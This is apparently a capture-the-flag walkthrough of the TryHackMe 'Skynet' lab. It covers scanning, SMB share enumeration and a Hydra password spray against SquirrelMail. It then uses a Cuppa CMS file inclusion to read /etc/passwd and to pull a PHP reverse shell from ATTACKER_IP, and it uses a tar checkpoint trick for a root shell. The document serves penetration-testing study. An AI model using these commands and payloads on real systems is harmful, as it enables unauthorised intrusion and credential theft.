# Skynet
[MITRE ATT&CK Enterprise tactics](https://attack.mitre.org/tactics/enterprise/)
## Reconnaissance (ID: TA0043)
### Active Scanning: Vulnerability Scanning (T1595.002)
```
nmap -Pn -O  -p- -sV -sC -oN TARGET_IP.nmap TARGET_IP
```
  * `-Pn` scan without pinging.
  * `-O` attempts to discover which OS is running.
  * `-p-` scan all ports.
  * `-sV` gather details about services and applications running on identified open ports.
  * `-sC` use default safe scripts for scan.
  * `-oN` output resuits in default/normal format.
```
Starting Nmap 7.60 ( https://nmap.org ) at 2024-03-01 10:02 GMT
Warning: 10.10.9.168 giving up on port because retransmission cap hit (2).
Nmap scan report for ip-10-10-9-168.eu-west-1.compute.internal (10.10.9.168)
Host is up (0.00038s latency).
Not shown: 65528 closed ports
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (EdDSA)
80/tcp    open     http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp   open     pop3        Dovecot pop3d
|_pop3-capabilities: CAPA SASL AUTH-RESP-CODE TOP RESP-CODES UIDL PIPELINING
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open     imap        Dovecot imapd
|_imap-capabilities: SASL-IR more post-login OK ID have ENABLE LOGINDISABLEDA0001 LOGIN-REFERRALS listed capabilities IMAP4rev1 Pre-login IDLE LITERAL+
445/tcp   open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
65403/tcp filtered unknown
MAC Address: 02:FC:A9:D7:37:E3 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-03-01T04:05:52-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-01 10:05:53
|_  start_date: 1600-12-31 23:58:45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.94 seconds

```
**SSH**
* OpenSSH 7.2p2 is vulnerable to exploitable [CVE-2016-6210](https://nvd.nist.gov/vuln/detail/CVE-2016-6210).
> sshd in OpenSSH before 7.3, when SHA256 or SHA512 are used for user password hashing, uses BLOWFISH hashing on a static password when the username does not exist, which allows remote attackers to enumerate users by leveraging the timing difference between responses when a large password is provided.
* [OpenSSH 7.2p2 - Username Enumeration](https://www.exploit-db.com/exploits/40136)
* [OpenSSHd 7.2p2 - Username Enumeration](https://www.exploit-db.com/exploits/40113).
**HTTP**
* Browse to http://TARGET_IP.
![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/064deb75-0b00-4063-a3a9-235970473303)

* Nmap vuln script identified possible CSRF vulnerabilities.
```
Path: http://ip-10-10-9-168.eu-west-1.compute.internal/#
Form id: 
Form action: #
```
* Apache 2.4.18 is vulnerable to a number of expolits.
  * [CVE-2021-44790](https://nvd.nist.gov/vuln/detail/CVE-2021-44790).
    * [Apache 2.4.x - Buffer Overflow](https://www.exploit-db.com/exploits/51193).
  * [CVE-2019-0211](https://nvd.nist.gov/vuln/detail/CVE-2019-0211).
    * [Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation](https://www.exploit-db.com/exploits/46676).

* Use GoBuster to search for hidden directories.
```
gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt > gobuster.txt

[snip...]
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail (Status: 301)
/server-status (Status: 403)
[snip...]
```
* Browse to http://TARGET_IP/squirrelmail.
![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/c99554e8-0f5d-4810-a457-22e8d10aae98)

* Squirrelmail 1.4.23 is potentially vulnerable to a number of exploits.
  * [CVE-2006-4019](https://nvd.nist.gov/vuln/detail/CVE-2006-4019).
    * [SquirrelMail < 1.4.7 - Arbitrary Variable Overwrite](https://www.exploit-db.com/exploits/43839).
  * [CVE-2005-2095](https://nvd.nist.gov/vuln/detail/CVE-2005-2095).
    * [SquirrelMail < 1.4.5-RC1 - Arbitrary Variable Overwrite](https://www.exploit-db.com/exploits/43830).
  * [CVE-2017-7692](https://nvd.nist.gov/vuln/detail/CVE-2017-7692).
    * [SquirrelMail < 1.4.22 - Remote Code Execution ](https://www.exploit-db.com/exploits/41910).
  * [CVE-2006-2842](https://nvd.nist.gov/vuln/detail/CVE-2006-2842).
    * [Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion](https://www.exploit-db.com/exploits/27948).
  * [CVE-2005-3128](https://nvd.nist.gov/vuln/detail/CVE-2005-3128).
    * [SquirrelMail 1.4.2 Address Add Plugin - 'add.php' Cross-Site Scripting ](https://www.exploit-db.com/exploits/26305).
  * [CVE-2004-0519](https://nvd.nist.gov/vuln/detail/CVE-2004-0519).
    * [SquirrelMail 1.4.x - Folder Name Cross-Site Scripting](https://www.exploit-db.com/exploits/24068).
* All other directories identified by Gobuster result in "Forbidden" message.
![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/aeb3f5c4-4516-44f2-b0fc-4c75a3a69c17)

**POP3**
* Dovecot pop3d.
**SMB**
* netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP).
* Enumerate target host for SMB Shares.
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN TARGET_IP_smb_scan.nmap TARGET_IP

Nmap scan report for ip-10-10-9-168.eu-west-1.compute.internal (10.10.9.168)
Host is up (0.00013s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:FC:A9:D7:37:E3 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.9.168\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.9.168\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.9.168\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.9.168\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-enum-users: 
|   SKYNET\milesdyson (RID: 1000)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
```
**IMAP**
* Dovecot pop3d.

## Initial Access (ID: TA0001)
* Inspect /anonymous SMB share.
```
smbclient //TARGET_IP/anonymous

WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019
```
* Recursively download \anonymous share.
  * Submit username and password as nothing.
```
smbget -R smb://TARGET_IP/anonymous

Password for [guest] connecting to //anonymous/10.10.9.168: 
Using workgroup WORKGROUP, user guest
smb://10.10.9.168/anonymous/attention.txt                                       
smb://10.10.9.168/anonymous/logs/log2.txt                                       
smb://10.10.9.168/anonymous/logs/log1.txt                                       
smb://10.10.9.168/anonymous/logs/log3.txt                                       
Downloaded 634b in 1 seconds
```
* Contents of "attention.txt".
> A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
* "log1.txt" contains potential list of passwords.
* Password spray Squirrelmail login page using Hydra.
1. Open Developer Tools in browser > Network tab.
2. Browse to http://TARGET_IP/squirrelmail.
3. Enter any credentials on login page > Login.
4. Right click on "redirect.php" POST request > "Edit and Resend".
5. Populate Hydra command.
   * Login or Wordlist for Usernames = milesdyson.
     * Login identified via target host SMB enumeration.
   * Password or Wordlist for Passwords = ./logs/log1/txt.
     * Wordlist downloaded from target host's /anonymous SMB share.
   * IP address or Hostname = TARGET_IP.
   * HTTP Method (POST/GET) = `http-form-post`.
   * Directory/Path to the Login Page = /squirrelmail/src/redirect.php.
     * "Filename" value within POST request header.
   * Request Body for Username/Password = login_username=testname&secretkey=testpass&js_autodetect_results=1&just_logged_in=1.
     * Body of New "redirect.php" POST Request created with "Edit and Resend".
   * Way to Identify Failed Attempts = Unknown user or password incorrect.
     * SquirrelMail browser error message when login fails.
6 Execute Hydra.
```
hydra -l milesdyson -P ./logs/log1.txt TARGET_IP -V http-form-post "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown User or password incorrect."

[snip ...]
[80][http-post-form] host: 10.10.9.168   login: milesdyson   password: cyborg007haloterminator
```
* Log into SquirrelMail using milesdyson credentials.
* "Samba Password reset" email in inbox.
> We have changed your smb password after system malfunction. Password: )s{A&2Z=F^n_E.B`
* Inspect Miles Dyson Personal SMB Share.
  * `-U` specifies username otherwise WORKGROUP\root is used.
```
smbclient -U milesdyson //TARGET_IP/milesdyson
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Sep 17 10:05:47 2019
  ..                                  D        0  Wed Sep 18 04:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019
  notes                               D        0  Tue Sep 17 10:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019

		9204224 blocks of size 1024. 5701580 blocks available
```
* Recursively download \milesdyson share.
```
smbget -U milesdyson -R smb://TARGET_IP/milesdyson
```
* "important.txt" file located in /notes directory.
> 1. Add features to beta CMS /45kra24zxs28v3yd
* Browse to http://TARGET_IP/45kra24zxs28v3yd.
  * Nothing unusual in page source.
* Use GoBuster to search for hidden directories.
```
gobuster dir --url http://TARGET_IP/45kra24zxs28v3yd -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt > gobuster_cms.txt

[snip ...]
/administrator (Status: 301)
```
* Browse to http://TARGET_IP/45kra24zxs28v3yd/administrator
* "Cuppa CMS" login page.
![image](https://github.com/clydebuilt1974/TryHackMe/assets/157394432/7460db7e-58bb-40cf-9648-85e2e7009ff1)
* Default admin / admin credentials from [Cuppa Documentation](https://www.cuppacms.com/en/docs/installation) do not work.
* Search for exploitable vulnerabilites.
  * [Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion](https://www.exploit-db.com/exploits/25971).
> An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
* Verified exploit functionality.
```
curl http://TARGET_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Field configuration:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false 
```
* Include a remote file for malicious purposes using remote files inclusion (RFI).
```
cp /usr/share/webshells/php/php-reverse-shell.php ./
```
* Change IP of php-reverse-shell.php to attack host.
* Create netcat listener.
```
nc -lvnp 1234
```
* Serve php-reverse-shell.php to target host.
```
python3 -m http.server
```
* Amend exploitable URL on target host to include hosted reverse shell.
```
curl http://TARGET_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP:8000/php-reverse-shell.php
```
* Target host requests php-reverse-shell.php.
```
10.10.9.168 - - [01/Mar/2024 13:09:52] "GET /php-reverse-shell.php HTTP/1.0" 200 -
```
* Reverse shell caught by listener.
```
Connection from 10.10.9.168 39380 received!
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 07:09:51 up  4:47,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
* Updgrade to interactive tty shell.
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
* Find user flag.
```
find / -name user.txt 2>/dev/null
```
## Privilege Escalation (ID: TA0004)
* List all commands current user can run using sudo.
```
sudo -l
[sudo] password for www-data:
```
  * No delegated sudo privileges.
* Enumerate crontab.
```
cat /etc/crontab

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
[snip ...]
```
* "/home/milesdyson/backups/backup.sh" runs every minute as root.
```
ls -la /home/milesdyson/backups/

[snip...]
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
[snip ...]

ls -la /home/milesdyson/backups/

[snip ...]
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Mar  1 16:26 backup.tgz
```
  * No privileges to rename or create files.
* Check contents of "backup.sh".
```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
  * Script changes directory to "/var/www/html" then uses "tar" to compress content of the directory into a file called "backup.tgz" at "/home/milesdyson/backups".
* Checked GTFOBins for tar exploits.
> [**Shell**](https://gtfobins.github.io/gtfobins/tar/#shell).  It can be used to break out from restricted environments by spawning an interactive system shell. `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`.




./linpeas.sh -a > linpeas.txt
```
